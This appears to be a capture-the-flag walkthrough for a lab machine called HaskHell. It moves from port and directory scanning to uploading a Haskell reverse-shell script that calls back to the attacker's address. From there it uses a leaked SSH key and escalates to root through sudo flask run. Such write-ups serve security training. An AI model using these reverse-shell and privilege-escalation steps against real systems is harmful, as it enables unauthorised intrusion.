# Name = HaskHell
```
IP: export IP=10.10.68.222
```
First ao all, we need to do a port scan using `nmap`
```bash
sudo nmap -sC -sV -A -T4 -p- -v -oN scans/nmap.initial $IP
```
Command |Result
--------|-------
-sC     |Run default scripts
-sV     |Enumerate versions
-A      |Aggresive mode
-T4     |Slightly faster scan
-p-     |Scan all ports
-v      |Verbose output
-oN     |Output to file
$IP     |Scan exported IP address

Output shows us only two open ports:

Ports open:
Port |Service
-----|----------
22   |ssh
5001 |gunicorn - web server

Walking around the page we notice that we should upload our scripts written in Haskell, but when we click link to uploads we see a 404 error. Somewhere around should be valid upload page, time to search for it. I primarily use `gobuster`
```bash
gobuster dir -u $IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```
Command  |Result
---------|--------
dir      |Directory scan
-u       |Url to scan
-w       |Path to wordlist

I found seclists to be updated and running great. Scanning with gobuster shows us another page:

Directory found
- /submit

Going to /submit page we found upload form, and judging from what we read earlier it woul only accept `*.hs` files, and trying with .txt file does nothing. Quick search around internet, and changig file format to .hs shows us it's true.
Looking around for suitabe code I found something that can spawn a reverse shell:
Simply write a script that spawns shell:
```haskell
import System.Process
main = do
   callCommand "bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_ADDR/LPORT 0>&1'"
```
To check the tun0 ip address simply type:
```bash
ip addr show tun0
```
and the address we need to type in the script is right after `inet`.


This is just a simple reverse shell as found on [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but preceded with bash -c to compile command.
After uploading the file it runs automatically, but don't forget to spawn netcat listener first!
```bash
nc -lvnp LPORT
```
LPORT is the port number we will listen on and must correspond with LPORT in Haskell script uploaded on the server.

We got the reverse shell! Time to stabilize it:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
press Ctrl + Z to bacground session, then type
```bash
stty raw -echo
```
type in fg (won't show because of echo), press ENTER twice
back on the shell type 
```bash
export TERM=xterm
```
and we can press TAB to autocomplete, press arrows to go back and such. This stabilized shell resembles our normal terminal window.

We can't get anything useful searching through files except the user flag located in /prof/user.txt:

User flag:
`flag{EDITED}`

And private RSA key for user prof!
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
EDITED
MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
-----END RSA PRIVATE KEY-----
```

Simply copy the key to Your machine and save it in id_rsa file. Next change file permissions to read-write for user only (600):
```bash
chmod 600 id_rsa
```
and we can log in to ssh using file with id key:
```bash
ssh prof@$IP -i id_rsa
```
Good, now we are a valid user logged on SSH, first thing I usually try to do is find out if i can use sudo commands:
```bash
sudo -l
```
This simple command shows us that indeed, we can run something:
```
User prof may run the following commands on haskhell:                                                                                 
    (root) NOPASSWD: /usr/bin/flask run
```
Running this command however, throws us an error:
```
Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.
```
Seems we need to give some variable to get it running. After a while of searching I foun out that it can accept python scripts as input. That's great news! Easiest way to exploit it is simple os spawn script in python:
```bash
nano shell.py
```
```python
import os
os.system('/bin/bash')
```
Save it as python script, then add the script to variable FLASK_APP:
```bash
export FLASK_APP=script.py
```
and run as superuser
```bash
sudo /usr/bin/flask run
```
Locate root flag at /root/root.txt
Root flag
`flag{EDITED}`

And that's it! Submit the flags on the page to get points!
Congratulations!
